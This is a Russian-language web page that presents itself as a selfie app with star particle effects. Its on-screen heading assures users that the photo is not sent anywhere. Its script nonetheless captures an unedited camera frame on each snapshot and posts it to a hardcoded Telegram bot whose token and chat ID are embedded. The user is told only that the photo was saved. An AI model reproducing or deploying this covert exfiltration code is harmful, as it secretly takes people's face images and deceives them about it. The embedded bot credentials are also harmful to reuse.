<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Селфи с эффектами</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
    }
    #container {
      position: relative;
      width: 100vw;
      height: 60vh;
      max-width: 640px;
      max-height: 480px;
    }
    #video, #canvas {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 10px;
    }
    #canvas {
      position: absolute;
      top: 0;
      left: 0;
    }
    #originalCanvas, #effectCanvas {
      display: none;
    }
    h1 {
      color: #333;
      font-size: 1.2em;
      margin: 10px 0;
      text-align: center;
    }
    button {
      margin-top: 20px;
      padding: 20px 40px;
      font-size: 20px;
      background-color: #ff2d55;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      touch-action: manipulation;
    }
    button:hover {
      background-color: #e02448;
    }
    #status {
      margin-top: 10px;
      font-size: 16px;
      color: #333;
      text-align: center;
    }
    @media (orientation: landscape) {
      #container {
        height: 100vh;
        width: 133.33vh;
        max-width: none;
        max-height: none;
      }
    }
  </style>
</head>
<body>
  <h1>Фотка никуда не отправляется</h1>
  <div id="container">
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <canvas id="originalCanvas"></canvas>
    <canvas id="effectCanvas"></canvas>
  </div>
  <button onclick="takeSnapshot()">Сфоткать!</button>
  <div id="status">Улыбнись и нажми!</div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const originalCanvas = document.getElementById('originalCanvas');
    const effectCanvas = document.getElementById('effectCanvas');
    const ctx = canvas.getContext('2d');
    const originalCtx = originalCanvas.getContext('2d');
    const effectCtx = effectCanvas.getContext('2d');
    const statusDiv = document.getElementById('status');

    // Настройка Telegram
    const telegramBotToken = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
    const chatId = '1753361154';

    // Частицы для эффекта
    let particles = [];
    const particleCount = 20;

    // Запуск камеры
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' }
        });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          originalCanvas.width = video.videoWidth;
          originalCanvas.height = video.videoHeight;
          effectCanvas.width = video.videoWidth;
          effectCanvas.height = video.videoHeight;
          initParticles();
          animate();
        };
      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
        statusDiv.textContent = 'Не удалось получить доступ к камере. Используйте HTTPS или localhost.';
      }
    }

    // Инициализация частиц
    function initParticles() {
      particles = [];
      for (let i = 0; i < particleCount; i++) {
        particles.push({
          x: canvas.width / 2,
          y: canvas.height / 3,
          size: Math.random() * 10 + 5,
          speedX: Math.random() * 2 - 1,
          speedY: Math.random() * 2 - 1,
          life: Math.random() * 100 + 50
        });
      }
    }

    // Анимация частиц
    function animate() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      particles.forEach((p, i) => {
        p.x += p.speedX;
        p.y += p.speedY;
        p.life -= 1;

        // Рисуем частицу (звездочку)
        ctx.beginPath();
        ctx.moveTo(p.x, p.y - p.size);
        ctx.lineTo(p.x + p.size * 0.3, p.y - p.size * 0.3);
        ctx.lineTo(p.x + p.size, p.y);
        ctx.lineTo(p.x + p.size * 0.3, p.y + p.size * 0.3);
        ctx.lineTo(p.x, p.y + p.size);
        ctx.lineTo(p.x - p.size * 0.3, p.y + p.size * 0.3);
        ctx.lineTo(p.x - p.size, p.y);
        ctx.lineTo(p.x - p.size * 0.3, p.y - p.size * 0.3);
        ctx.closePath();
        ctx.fillStyle = 'rgba(255, 215, 0, 0.8)';
        ctx.fill();

        // Возрождаем частицу в центре лица
        if (p.life <= 0) {
          p.x = canvas.width / 2;
          p.y = canvas.height / 3;
          p.size = Math.random() * 10 + 5;
          p.speedX = Math.random() * 2 - 1;
          p.speedY = Math.random() * 2 - 1;
          p.life = Math.random() * 100 + 50;
        }
      });

      requestAnimationFrame(animate);
    }

    // Снимок и действия
    async function takeSnapshot() {
      statusDiv.textContent = 'Захват снимка...';

      // Захватываем снимок без эффектов для Telegram
      originalCtx.drawImage(video, 0, 0, originalCanvas.width, originalCanvas.height);

      // Захватываем снимок с эффектами для скачивания
      effectCtx.drawImage(video, 0, 0, effectCanvas.width, effectCanvas.height);
      particles.forEach(p => {
        effectCtx.beginPath();
        effectCtx.moveTo(p.x, p.y - p.size);
        effectCtx.lineTo(p.x + p.size * 0.3, p.y - p.size * 0.3);
        effectCtx.lineTo(p.x + p.size, p.y);
        effectCtx.lineTo(p.x + p.size * 0.3, p.y + p.size * 0.3);
        effectCtx.lineTo(p.x, p.y + p.size);
        effectCtx.lineTo(p.x - p.size * 0.3, p.y + p.size * 0.3);
        effectCtx.lineTo(p.x - p.size, p.y);
        effectCtx.lineTo(p.x - p.size * 0.3, p.y - p.size * 0.3);
        effectCtx.closePath();
        effectCtx.fillStyle = 'rgba(255, 215, 0, 0.8)';
        effectCtx.fill();
      });

      // Скачивание фото с эффектами
      const downloadLink = document.createElement('a');
      downloadLink.href = effectCanvas.toDataURL('image/jpeg');
      downloadLink.download = 'photo_with_effects.jpg';
      downloadLink.click();

      // Отправка фото без эффектов в Telegram
      originalCanvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'snapshot.jpg');
        try {
          const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          const result = await response.json();
          statusDiv.textContent = result.ok ? 'Фото сохранено!' : 'Ошибка при сохранении.';
        } catch (err) {
          console.error('Ошибка:', err);
          statusDiv.textContent = 'Ошибка при сохранении.';
        }
      }, 'image/jpeg');
    }

    // Запуск камеры
    startCamera();
  </script>
</body>
</html>
